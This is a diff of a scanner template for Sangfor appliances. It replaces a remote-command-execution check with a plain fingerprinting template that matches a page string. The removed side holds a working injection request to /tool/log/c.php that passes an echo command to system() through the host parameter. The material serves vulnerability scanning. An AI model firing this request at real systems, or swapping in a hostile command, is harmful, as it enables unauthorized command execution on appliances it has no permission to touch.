@@ -1,34 +1,25 @@
-id: Sangfor
+id: sangfor
 info:
-  author: hacktifycs
-  description: An adversary can perform a Remote Code Execution
-  name: Sangfor Behavior Perception System && Log Center Remote Command Execution
-    Vulnerability
-  reference: unknown
-  severity: high
-  tags: sangfor, rce
+  name: sangfor
+  author: cn-kali-team
+  tags: detect,tech,sangfor
+  severity: info
+  metadata:
+    fofa-query:
+    - app="sangfor"
+    - fid="iaytna57019/kadk8nev7g=="
+    - 'ishighperformance : !!sfishighperformance'
+    - app="sangfor-应用交付管理系统"
+    - app="sangfor-应用交付报表系统"
+    product: sangfor
+    vendor: sangfor
+    verified: true
 http:
-- matchers:
-  - part: body
-    type: word
+- method: GET
+  path:
+  - '{{BaseURL}}/'
+  matchers:
+  - type: word
     words:
-    - '{{randstr}}'
-  - status:
-    - 200
-    type: status
-  matchers-condition: and
-  raw:
-  - 'GET /tool/log/c.php?strip_slashes=system&host=echo%20{{randstr}} HTTP/1.1
-
-    Host: {{Hostname}}
-
-    Cache-Control: max-age=0
-
-    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
-
-    Accept-Language: en-US,en;q=0.9
-
-    Connection: close
-
-
-    '
+    - 'ishighperformance : !!sfishighperformance'
+    case-insensitive: true
